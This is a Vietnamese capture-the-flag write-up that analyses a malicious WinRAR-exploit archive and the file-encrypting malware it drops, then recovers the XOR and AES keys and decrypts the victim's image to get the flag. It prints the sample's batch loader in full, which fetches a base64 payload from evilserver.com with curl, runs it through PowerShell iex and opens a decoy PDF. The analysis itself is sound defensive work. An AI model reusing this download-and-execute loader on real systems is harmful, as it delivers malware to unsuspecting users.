# Guessing.

Chall : https://drive.google.com/file/d/1A6PQX4KitPRWyPzkN-8TVUZpShLzK2mD/view?usp=drive_link

Description: I received an email from an unidentified sender who described an intriguing world. Intrigued by their narrative, I followed the link in the email, downloaded a file, and attempted to open it. To my surprise, my essential documents were suddenly encrypted. I'm now in need of assistance to recover them.


----
Đề cho 1 file zip, chỉ cần mở ra nhìn đã dễ dàng nhận ra là con CVE winrar khá nổi gần đây :v. Mình sẽ vào folder bên trong và extract thẳng con bat file ra. Nội dung file bat:

```
@echo off
setlocal
set "ServerURL=http://evilserver.com:8080/useless.png"
for /f "delims=" %%i in ('curl -s -X GET "%ServerURL%"') do set response=%%i
powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%response%')) | iex"
Pancham.pdf
endlocal
```

Nó sẽ tải xuống useless.png, decode ra và iex để thực thi, sau đó pop up pdf để đánh lừa.

Decode nội dung và ta có được 1 script powershell bị obfuscate:

![image](https://github.com/NVex0/uWU/assets/113530029/1cacee44-d0a4-4075-9885-7076907e464e)

Mình dùng `PSDecode` để deobfuscate:

![image](https://github.com/NVex0/uWU/assets/113530029/842a0cb0-af31-4775-b9d6-1cd997c9d25e)

Code này sẽ thực hiện tải xuống con panpan.exe, mở file `final report` làm key xor và xor với các bytes trong panpan.exe (từ bytes thứ 1024, size xor là 31488). Sau khi xor thì sẽ thực thi con exe đầu ra.

Tuy nhiên ta không có file `final report`, mình ngồi thử với các header của file docx, pdf,....nhưng không khả quan, nên mình bỏ hướng này. Tuy nhiên khi mình load vào `pebear` cùng 1 vài sample PE 64 bit khác, mình để ý:

![image](https://github.com/NVex0/uWU/assets/113530029/61bdf04f-ae23-4596-9d66-749b23b84977)

Phần entry point của file này bắt đầu bằng 5 bytes 0, khá lạ, trong khi các file khác thì đều bắt đầu với dãy `48 83 EC 28 E8 F7 04 00 00 48 83 C4 28 E9 72 FE FF FF CC CC 40 53 48 83 EC 20 48 8B D9 33 C9 FF 15 BB 56 01 00 48 8B CB FF 15 AA 56 01 00 FF 15`, mình đem đi xor thử:

![image](https://github.com/NVex0/uWU/assets/113530029/07075e86-fee5-4a20-8c38-3dc7c254b054)

Để ý thấy `\x48\x83\xec\x28\xe8` lặp lại rất nhiều lần, mình đoán chắc rằng đây là xor key, mình xor thẳng lại với panpan.exe:

```
with open('PanCham.exe', 'rb') as f:
    fileb = f.read()

key = b"\x48\x83\xec\x28\xe8"
offset = 1024
size = 31488

with open("final.exe", "wb") as f:
    for i in range(len(fileb)):
        if i in range(offset, offset + size):
            f.write((fileb[i] ^ key[i % len(key)]).to_bytes(1, byteorder='big'))
        else:
            f.write(fileb[i].to_bytes(1, byteorder='big'))
```

Và load được vào ida mà không bị lỗi :v Nice. Mình tìm đến hàm main:

![image](https://github.com/NVex0/uWU/assets/113530029/59ee015a-6dd1-4eaf-b416-4d35c7c65b5c)

Sau 1 khoảng thời gian rất lâu đọc code:v, mình hiểu nó thực thi như sau:

1. GET data từ root của evilserver, sau đó dùng 1 hàm để decode base64. Data này dễ dàng thấy trong tcp stream 7.

2. xor decoded data ở trên với 8 bytes lấy từ file `version.txt`.

3. Dùng kết quả xor này, sẽ dùng để tạo key, iv,....các thứ, sau đó encrypt ảnh SensitiveData.png lại.

Vì không có file version.txt, ta buộc phải tự tìm lại key. Mình để ý tới hàm `CryptImportKey`, như bước thứ 3 mình nếu trên, kết quả của xor chính là dùng trong hàm này. hàm này sẽ phải khởi tạo PUBLICKEYSTRUC BLOB header trước, xong mới đến các thông tin khác. Dựa vào Blob, mình sẽ retrieve lại key như này:

+ Đầu tiên là 1 byte key blob type. Theo doc của microsoft, key blob type có 8 loại. Cái này mình sẽ bruteforce vì mình không biết key là loại nào.

+ Tiếp đến là 1 byte version, mà theo mình đọc thì nó thường được set = 0x02:

![image](https://github.com/NVex0/uWU/assets/113530029/ce8bdf12-a75b-4ef0-bfef-d79a1e181c70)

+ 2 bytes reversed, theo như doc của microsoft thì `must be set to zero`, vậy là mình có 0x0000.

+ Tiếp là 4 bytes ALG_ID lưu dưới dạng little endian, như đã nói trên, ở dưới mình thấy có hàm `CryptSetKeyParam` set các giá trị như cipher mode, padding mode, iv các thứ. Từ đó mình đoán rằng mã hóa này là AES, nhưng key length không rõ, nên mình sẽ thử ALG_ID của tất cả các loại length AES.

Mình brute thử key, trong quá trình brute mình để ý toàn bộ key đều là ASCII hết:

![image](https://github.com/NVex0/uWU/assets/113530029/c1804390-86c3-4ff1-a237-5798e6659c14)

Từ đó mình rút ra type sẽ là `PLAINTEXTKEYBLOB`, tức byte đầu = 0x08.

Rút ngắn phạm vi :v, vì là ASCII hết nên mình in thẳng char và được 4 key còn lại như này:

![image](https://github.com/NVex0/uWU/assets/113530029/e419ca64-3494-4173-a11c-a5895e968aa1)

:)) Key đầu hơi hơi meaningful, hợp lý hóa hơn thì nó là key tương ứng với ALG_ID của AES_256, đúng ý mình. Mình sẽ thử với xorkey này luôn.

Sau khi xor mình được pbData mới sẽ là : `0802000010660000200000009d0e0433bf40f4141a030f2d8effa8b88c7e56cc459cb7bad982879478b18e53c5bb3a7478ba51be09b9e8f6892fabb3`

> Mình tìm hiểu cả ngày cũng không hiểu đoạn thừa `20000000` sau blob là cái gì, nhưng nghĩ làm gì có key nào bắt đầu đầy 00 00 thế kia nên mình bỏ qua luôn 💀.

Dựa vào dòng 47 trong main, ta lấy IV là 16 bytes cuối pbData, còn key thì như nói trên, mình skip đoạn `20000000` và lấy 32 bytes, vừa hay là nó vừa khít length của pbData khai báo trong hàm `CryptImportKey`. Decrypt với iv và key như vậy, mình khôi phục lại được ảnh và lấy flag:

![image](https://github.com/NVex0/uWU/assets/113530029/a5dd3cdd-9870-439e-8169-c88eb6e24e55)

Flag: `ASCIS{What?_PANCHAM_1s_3v0lving!}`


